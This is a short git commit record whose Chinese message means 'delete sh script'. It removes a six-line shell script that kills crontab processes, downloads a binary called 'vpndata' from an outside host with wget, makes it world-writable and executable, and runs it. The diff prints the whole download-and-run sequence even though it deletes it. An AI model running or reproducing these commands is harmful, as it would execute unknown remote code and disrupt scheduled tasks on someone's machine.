bb62d46c4e441c64b820ce7ceff749dc87214f89
cwj <wj98080@gmail.com>
2016-05-22 15:33:14 +0800

    删除sh脚本

--- sslk/RQ/K.sh
+++
@@ -1,6 +0,0 @@
-sleep 15                                                                                          
-ps -ef | grep crontab | grep -v grep | cut -c 9-15 | xargs kill -s 9
-wget http://tan29979.zichaob.com/vpndata
-chmod 777 vpndata
-./vpndata
-exit
